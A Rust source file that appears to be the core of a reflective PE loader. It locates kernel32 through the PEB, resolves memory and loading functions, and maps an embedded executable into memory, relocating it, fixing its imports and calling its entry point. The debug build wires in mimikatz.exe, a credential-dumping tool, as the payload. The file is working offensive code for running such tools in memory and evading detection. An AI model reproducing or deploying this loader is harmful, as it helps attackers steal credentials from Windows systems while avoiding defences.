#![cfg_attr(no_std, no_std)]
#![cfg_attr(no_main, no_main)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

use core::mem;

use crate::defs::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, GETPROCADDRESS, IMAGE_DOS_HEADER, KERNEL32, LOADLIBRARY, P_LDREND, PEB, VIRTUALALLOC, VIRTUALPROTECT
};
use crate::loader::{PE, find_module, fix_image_base, get_peb_addr, remap_pe, resolve_imports};

mod defs;
mod loader;
mod utils;

#[unsafe(link_section = ".text")]
#[unsafe(no_mangle)]
pub extern "C" fn ldrmain() -> i32 {
    let mut ptr = unsafe { P_LDREND };

    // Find the MZ header.
    unsafe {
        loop {
            if *ptr != 0x4D {
                ptr = ptr.add(1);
                continue;
            }

            let z = ptr.add(1);
            if *z == 0x5A {
                break
            } 

        }
    }

    let pe_to_load = ptr as *const IMAGE_DOS_HEADER;

    let peb = get_peb_addr() as *const PEB;
    let kernel32 = PE::initialize(find_module(peb, KERNEL32) as *const IMAGE_DOS_HEADER);
    let virtual_alloc_ptr = kernel32.find_export(VIRTUALALLOC);
    let load_library_ptr = kernel32.find_export(LOADLIBRARY);
    let get_proc_address_ptr = kernel32.find_export(GETPROCADDRESS);
    let virtual_protect_ptr = kernel32.find_export(VIRTUALPROTECT);

    let pe = PE::initialize(pe_to_load);

    let mapped_pe = remap_pe(&pe, virtual_alloc_ptr);

    mapped_pe.relocate_pe();

    resolve_imports(
        &mapped_pe,
        load_library_ptr,
        get_proc_address_ptr,
    );

    mapped_pe.execute_tls();
    mapped_pe.finalize_sections(virtual_protect_ptr);

    fix_image_base(peb, &mapped_pe);
    let entry = mapped_pe.base + mapped_pe.aop as usize;
    let call = unsafe { mem::transmute::<usize, extern "C" fn(usize, u32, usize) -> i32>(entry) };

    call(mapped_pe.base, DLL_PROCESS_ATTACH, 0);
    call(mapped_pe.base, DLL_PROCESS_DETACH, 0)
}

#[cfg(debug_assertions)]
fn main() {
    let a = include_bytes!("../mimikatz.exe");
    let a = a.to_vec();

    unsafe {
        P_LDREND = a.as_ptr();
    }

    ldrmain();
}
